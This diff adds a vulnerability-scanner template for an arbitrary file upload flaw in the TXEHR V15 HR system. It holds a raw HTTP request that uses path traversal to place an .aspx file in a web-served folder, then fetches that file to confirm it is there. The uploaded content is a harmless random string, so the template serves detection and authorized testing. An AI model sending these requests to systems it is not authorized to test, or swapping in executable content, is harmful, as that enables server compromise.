@@ -1,0 +1,40 @@
+id: tongxiang-TXEHR-hdlUploadFile-upload
+
+info:
+  name: 同享人力资源管理系统 TXEHR V15 hdlUploadFile.ashx 任意文件上传漏洞
+  author: tongxiang
+  severity: high
+  tags: tongxiang
+
+http:
+  - raw:
+      - |
+        POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/jfow04isi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Connection: close
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="Filedata"; filename="jfow04isi.aspx"
+        Content-Type: text/plain
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+      - |+
+        GET /Style/jfow04isi.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
